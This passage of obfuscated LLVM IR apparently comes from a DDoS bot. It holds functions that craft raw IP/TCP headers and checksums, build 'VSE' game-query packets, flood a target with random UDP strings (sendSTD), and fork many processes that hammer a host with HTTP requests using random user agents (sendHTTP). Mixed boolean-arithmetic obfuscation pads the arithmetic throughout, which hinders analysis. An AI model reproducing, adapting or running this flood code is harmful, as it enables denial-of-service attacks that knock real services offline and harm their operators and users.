  %52 = sub i32 0, %50
  %53 = sub i32 %51, %52
  %54 = add i32 %51, %50
  store i32 %53, i32* %12, align 4
  br label %55

; <label>:55:                                     ; preds = %46, %43
  %56 = load i32, i32* %10, align 4
  %57 = lshr i32 %56, 16
  %58 = xor i32 %57, -1
  %59 = xor i32 65535, -1
  %60 = xor i32 -63013098, -1
  %61 = or i32 %58, %59
  %62 = or i32 -63013098, %60
  %63 = xor i32 %61, -1
  %64 = and i32 %63, %62
  %65 = and i32 %57, 65535
  %66 = load i32, i32* %12, align 4
  %67 = sub i32 0, %66
  %68 = sub i32 0, %64
  %69 = add i32 %67, %68
  %70 = sub i32 0, %69
  %71 = add i32 %66, %64
  store i32 %70, i32* %12, align 4
  %72 = load i32, i32* %10, align 4
  %73 = xor i32 65535, -1
  %74 = xor i32 %72, %73
  %75 = and i32 %74, %72
  %76 = and i32 %72, 65535
  %77 = load i32, i32* %12, align 4
  %78 = sub i32 0, %77
  %79 = sub i32 0, %75
  %80 = add i32 %78, %79
  %81 = sub i32 0, %80
  %82 = add i32 %77, %75
  store i32 %81, i32* %12, align 4
  %83 = load i32, i32* %11, align 4
  %84 = lshr i32 %83, 16
  %85 = xor i32 %84, -1
  %86 = xor i32 65535, -1
  %87 = xor i32 190036702, -1
  %88 = or i32 %85, %86
  %89 = or i32 190036702, %87
  %90 = xor i32 %88, -1
  %91 = and i32 %90, %89
  %92 = and i32 %84, 65535
  %93 = load i32, i32* %12, align 4
  %94 = sub i32 %93, -882923628
  %95 = add i32 %94, %91
  %96 = add i32 %95, -882923628
  %97 = add i32 %93, %91
  store i32 %96, i32* %12, align 4
  %98 = load i32, i32* %11, align 4
  %99 = xor i32 %98, -1
  %100 = xor i32 65535, -1
  %101 = xor i32 -971362606, -1
  %102 = or i32 %99, %100
  %103 = or i32 -971362606, %101
  %104 = xor i32 %102, -1
  %105 = and i32 %104, %103
  %106 = and i32 %98, 65535
  %107 = load i32, i32* %12, align 4
  %108 = sub i32 0, %105
  %109 = sub i32 %107, %108
  %110 = add i32 %107, %105
  store i32 %109, i32* %12, align 4
  %111 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i32 0, i32 6
  %113 = load i8, i8* %112, align 1
  %114 = zext i8 %113 to i16
  %115 = call zeroext i16 @htons(i16 zeroext %114) #13
  %116 = zext i16 %115 to i32
  %117 = load i32, i32* %12, align 4
  %118 = add i32 %117, 1075091497
  %119 = add i32 %118, %116
  %120 = sub i32 %119, 1075091497
  %121 = add i32 %117, %116
  store i32 %120, i32* %12, align 4
  %122 = load i16, i16* %7, align 2
  %123 = zext i16 %122 to i32
  %124 = load i32, i32* %12, align 4
  %125 = sub i32 0, %123
  %126 = sub i32 %124, %125
  %127 = add i32 %124, %123
  store i32 %126, i32* %12, align 4
  br label %128

; <label>:128:                                    ; preds = %132, %55
  %129 = load i32, i32* %12, align 4
  %130 = lshr i32 %129, 16
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %148

; <label>:132:                                    ; preds = %128
  %133 = load i32, i32* %12, align 4
  %134 = xor i32 %133, -1
  %135 = xor i32 65535, -1
  %136 = xor i32 360203616, -1
  %137 = or i32 %134, %135
  %138 = or i32 360203616, %136
  %139 = xor i32 %137, -1
  %140 = and i32 %139, %138
  %141 = and i32 %133, 65535
  %142 = load i32, i32* %12, align 4
  %143 = lshr i32 %142, 16
  %144 = sub i32 %140, 167662334
  %145 = add i32 %144, %143
  %146 = add i32 %145, 167662334
  %147 = add i32 %140, %143
  store i32 %146, i32* %12, align 4
  br label %128

; <label>:148:                                    ; preds = %128
  %149 = load i32, i32* %12, align 4
  %150 = xor i32 %149, -1
  %151 = and i32 -1, %150
  %152 = xor i32 -1, -1
  %153 = and i32 %149, %152
  %154 = or i32 %151, %153
  %155 = xor i32 %149, -1
  %156 = trunc i32 %154 to i16
  ret i16 %156
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = xor i8 %16, -1
  %19 = xor i8 5, -1
  %20 = xor i8 82, -1
  %21 = and i8 %18, 82
  %22 = and i8 %16, %20
  %23 = and i8 %19, 82
  %24 = and i8 5, %20
  %25 = or i8 %21, %22
  %26 = or i8 %23, %24
  %27 = xor i8 %25, %26
  %28 = or i8 %18, %19
  %29 = xor i8 %28, -1
  %30 = or i8 82, %20
  %31 = and i8 %29, %30
  %32 = or i8 %27, %31
  %33 = or i8 %16, 5
  store i8 %32, i8* %12, align 4
  %34 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %35 = bitcast %struct.iphdr* %34 to i8*
  %36 = load i8, i8* %35, align 4
  %37 = xor i8 %36, -1
  %38 = xor i8 15, -1
  %39 = xor i8 -102, -1
  %40 = or i8 %37, %38
  %41 = or i8 -102, %39
  %42 = xor i8 %40, -1
  %43 = and i8 %42, %41
  %44 = and i8 %36, 15
  %45 = xor i8 %43, -1
  %46 = xor i8 64, -1
  %47 = xor i8 -28, -1
  %48 = and i8 %45, -28
  %49 = and i8 %43, %47
  %50 = and i8 %46, -28
  %51 = and i8 64, %47
  %52 = or i8 %48, %49
  %53 = or i8 %50, %51
  %54 = xor i8 %52, %53
  %55 = or i8 %45, %46
  %56 = xor i8 %55, -1
  %57 = or i8 -28, %47
  %58 = and i8 %56, %57
  %59 = or i8 %54, %58
  %60 = or i8 %43, 64
  store i8 %59, i8* %35, align 4
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 1
  store i8 0, i8* %62, align 1
  %63 = load i32, i32* %10, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = sub i64 20, %65
  %67 = add i64 20, %64
  %68 = trunc i64 %66 to i16
  %69 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %70 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %69, i32 0, i32 2
  store i16 %68, i16* %70, align 2
  %71 = call i32 @rand_cmwc()
  %72 = trunc i32 %71 to i16
  %73 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %74 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %73, i32 0, i32 3
  store i16 %72, i16* %74, align 4
  %75 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %76 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %75, i32 0, i32 4
  store i16 0, i16* %76, align 2
  %77 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 5
  store i8 -1, i8* %78, align 4
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %81 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %80, i32 0, i32 6
  store i8 %79, i8* %81, align 1
  %82 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %83 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %82, i32 0, i32 7
  store i16 0, i16* %83, align 2
  %84 = load i32, i32* %8, align 4
  %85 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 8
  store i32 %84, i32* %86, align 4
  %87 = load i32, i32* %7, align 4
  %88 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i32 0, i32 9
  store i32 %87, i32* %89, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeVSEPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %11, align 8
  %13 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %14 = bitcast %struct.iphdr* %13 to i8*
  %15 = load i8, i8* %14, align 4
  %16 = xor i8 %15, -1
  %17 = xor i8 -16, -1
  %18 = xor i8 -44, -1
  %19 = or i8 %16, %17
  %20 = or i8 -44, %18
  %21 = xor i8 %19, -1
  %22 = and i8 %21, %20
  %23 = and i8 %15, -16
  %24 = and i8 %22, 5
  %25 = xor i8 %22, 5
  %26 = or i8 %24, %25
  %27 = or i8 %22, 5
  store i8 %26, i8* %14, align 4
  %28 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %29 = bitcast %struct.iphdr* %28 to i8*
  %30 = load i8, i8* %29, align 4
  %31 = xor i8 15, -1
  %32 = xor i8 %30, %31
  %33 = and i8 %32, %30
  %34 = and i8 %30, 15
  %35 = xor i8 %33, -1
  %36 = xor i8 64, -1
  %37 = xor i8 -54, -1
  %38 = and i8 %35, -54
  %39 = and i8 %33, %37
  %40 = and i8 %36, -54
  %41 = and i8 64, %37
  %42 = or i8 %38, %39
  %43 = or i8 %40, %41
  %44 = xor i8 %42, %43
  %45 = or i8 %35, %36
  %46 = xor i8 %45, -1
  %47 = or i8 -54, %37
  %48 = and i8 %46, %47
  %49 = or i8 %44, %48
  %50 = or i8 %33, 64
  store i8 %49, i8* %29, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 1
  store i8 0, i8* %52, align 1
  %53 = load i32, i32* %10, align 4
  %54 = sext i32 %53 to i64
  %55 = add i64 20, -6550413650266097409
  %56 = add i64 %55, %54
  %57 = sub i64 %56, -6550413650266097409
  %58 = add i64 20, %54
  %59 = load i32, i32* %12, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 %57, 8910177994027016886
  %62 = add i64 %61, %60
  %63 = add i64 %62, 8910177994027016886
  %64 = add i64 %57, %60
  %65 = trunc i64 %63 to i16
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 2
  store i16 %65, i16* %67, align 2
  %68 = call i32 @rand_cmwc()
  %69 = trunc i32 %68 to i16
  %70 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %71 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %70, i32 0, i32 3
  store i16 %69, i16* %71, align 4
  %72 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %73 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %72, i32 0, i32 4
  store i16 0, i16* %73, align 2
  %74 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 5
  store i8 -1, i8* %75, align 4
  %76 = load i8, i8* %9, align 1
  %77 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 6
  store i8 %76, i8* %78, align 1
  %79 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 7
  store i16 0, i16* %80, align 2
  %81 = load i32, i32* %8, align 4
  %82 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %83 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %82, i32 0, i32 8
  store i32 %81, i32* %83, align 4
  %84 = load i32, i32* %7, align 4
  %85 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 9
  store i32 %84, i32* %86, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %69, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %69

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 50, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = add i64 %57, 8580600987259875130
  %61 = add i64 %60, %59
  %62 = sub i64 %61, 8580600987259875130
  %63 = add nsw i64 %57, %59
  %64 = icmp sge i64 %56, %62
  br i1 %64, label %65, label %68

; <label>:65:                                     ; preds = %48
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  call void @_exit(i32 0) #12
  unreachable

; <label>:68:                                     ; preds = %48
  store i32 0, i32* %11, align 4
  br label %69

; <label>:69:                                     ; preds = %68, %39
  %70 = load i32, i32* %11, align 4
  %71 = sub i32 0, 1
  %72 = sub i32 %70, %71
  %73 = add i32 %70, 1
  store i32 %72, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [1 x i8], align 1
  %11 = alloca [512 x i8], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %9, align 8
  %17 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %17, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i32 @getdtablesize() #2
  %20 = sdiv i32 %19, 2
  store i32 %20, i32* %14, align 4
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %118, %3
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %14, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %124

; <label>:25:                                     ; preds = %21
  %26 = call i32 @fork() #2
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %117

; <label>:28:                                     ; preds = %25
  br label %29

; <label>:29:                                     ; preds = %116, %28
  %30 = load i8*, i8** %4, align 8
  %31 = load i32, i32* %5, align 4
  %32 = trunc i32 %31 to i16
  %33 = call i32 @socket_connect(i8* %30, i16 zeroext %32)
  store i32 %33, i32* %8, align 4
  %34 = load i32, i32* %8, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %105

; <label>:36:                                     ; preds = %29
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %38 = call i8* @strcpy(i8* %37, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0)) #2
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %41 = call i64 @strlen(i8* %40) #10
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = call i32 @rand() #2
  %44 = sext i32 %43 to i64
  %45 = urem i64 %44, 3
  %46 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 %45
  %47 = load i8*, i8** %46, align 8
  %48 = call i8* @strcpy(i8* %42, i8* %47) #2
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %51 = call i64 @strlen(i8* %50) #10
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = call i8* @strcpy(i8* %52, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.81, i32 0, i32 0)) #2
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %56 = call i64 @strlen(i8* %55) #10
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = load i8*, i8** %4, align 8
  %59 = call i8* @strcpy(i8* %57, i8* %58) #2
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %62 = call i64 @strlen(i8* %61) #10
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = call i8* @strcpy(i8* %63, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.82, i32 0, i32 0)) #2
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i32 @rand() #2
  %70 = sext i32 %69 to i64
  %71 = urem i64 %70, 32
  %72 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %71
  %73 = load i8*, i8** %72, align 8
  %74 = call i8* @strcpy(i8* %68, i8* %73) #2
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %77 = call i64 @strlen(i8* %76) #10
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = call i8* @strcpy(i8* %78, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.83, i32 0, i32 0)) #2
  %80 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %81 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %82 = call i64 @strlen(i8* %81) #10
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = call i32 @rand() #2
  %85 = sext i32 %84 to i64
  %86 = urem i64 %85, 3
  %87 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = call i8* @strcpy(i8* %83, i8* %88) #2
